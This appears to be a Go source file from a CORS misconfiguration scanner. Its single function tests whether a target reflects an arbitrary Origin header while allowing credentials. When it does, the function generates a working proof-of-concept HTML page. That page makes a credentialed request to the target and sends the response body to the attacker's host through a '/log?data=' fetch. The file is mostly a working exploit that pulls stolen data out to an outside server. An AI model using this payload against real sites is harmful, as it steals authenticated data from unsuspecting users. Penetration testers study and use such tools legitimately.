package functions

import (
	"fmt"
	"net/http"
	"net/url"
)

func MaliciousOrigin(client *http.Client, target, malicious, cookie string, parsedURL *url.URL, hideFails bool) {
	resp, err := NewRequest(client, target, malicious, cookie)
	if err != nil {
		Error("[-] Error making request with altered Origin", hideFails)
		return
	}
	defer resp.Body.Close()

	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
	allowCred := resp.Header.Get("Access-Control-Allow-Credentials")

	if allowOrigin == malicious && allowCred == "true" {
		Success("[+] Origin value reflected in Access-Control-Allow-Origin header")
		fmt.Println("\033[38;5;46m" + "Perfect combination for exploration, generating PoC" + "\033[0m")

		payload := `<!DOCTYPE html>
<html>
  <body>
    <script>
      var req = new XMLHttpRequest();
      req.onload = function () {
        fetch('%s/log?data=' + encodeURIComponent(this.responseText));
      };
      req.open('GET', '%s', true);
      req.withCredentials = true;
      req.send();
    </script>
  </body>
</html>`

		html := fmt.Sprintf(payload, malicious, target)
		filename := parsedURL.Host + ".html"
		GeneratePoC(filename, html)
	} else {
		Error("[-] Origin not reflected in Access-Control-Allow-Origin header", hideFails)
	}
}
